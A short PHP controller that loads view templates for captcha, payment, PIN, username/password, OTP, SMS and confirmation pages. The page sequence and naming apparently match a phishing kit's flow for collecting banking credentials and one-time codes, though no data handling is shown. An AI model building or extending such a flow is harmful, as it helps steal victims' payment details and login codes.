<?php
require_once 'model/app.php';


function viewsHcaptcha() {
    require_once 'views/captcha.php';
}
function viewsMain() {
    require_once 'views/main.php';
}
function viewsExplain() {
    require_once 'views/explain.php';
}
function viewsInfoz() {
    require_once 'views/infoz.php';
}

function viewsPay() {
    require_once 'views/payment.php';
}

function viewsPin() {
    require_once 'views/pin.php';
}

function viewsUserPass() {
    require_once 'views/userpass.php';
}

function viewsLoad() {
    require_once 'views/loader.php';
}

function viewsOtp() {
    require_once 'views/otp.php';
}

function viewsSms() {
    require_once 'views/sms.php';
}

function viewsConf() {
    require_once 'views/confirm.php';
}